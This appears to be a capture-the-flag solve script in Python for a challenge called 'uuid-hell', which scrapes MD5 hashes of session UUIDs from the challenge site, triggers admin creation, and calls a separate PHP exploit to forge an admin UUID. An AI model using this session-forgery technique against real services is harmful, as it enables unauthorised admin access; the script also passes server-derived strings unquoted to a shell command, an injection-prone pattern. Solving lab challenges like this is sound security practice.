import requests
import time
import hashlib
import os
url="https://uuid-hell.lac.tf/"

uuid = requests.get(url).cookies.get_dict()['id']
print(requests.post(url+"createadmin").text)
uuid2 = requests.get(url).cookies.get_dict()['id']

time.sleep(10)
r = requests.get(url).text
admin_hashs = r.split("\n")[1:51]
admin_hashs = list(map(lambda x: x[8:-10],admin_hashs))
user_hashs = r.split("\n")[52:101]
user_hashs = list(map(lambda x: x[8:-10],user_hashs))

uuid_hash = hashlib.md5(uuid.encode()).hexdigest()
if uuid_hash in user_hashs:
    print("User Hash Poition:",user_hashs.index(uuid_hash))
else:
    print("User Hash:",uuid_hash)
    print(user_hashs)
    print("User Hash Poition: Not Found")
    exit()

# print("Admin Hash:",','.join(admin_hashs))
print("Length:",len(admin_hashs))
print("Regular UUID:",uuid)
print("Regular UUID2:",uuid2)
os.system("php exp.php "+uuid+" "+','.join(admin_hashs)+" "+uuid2)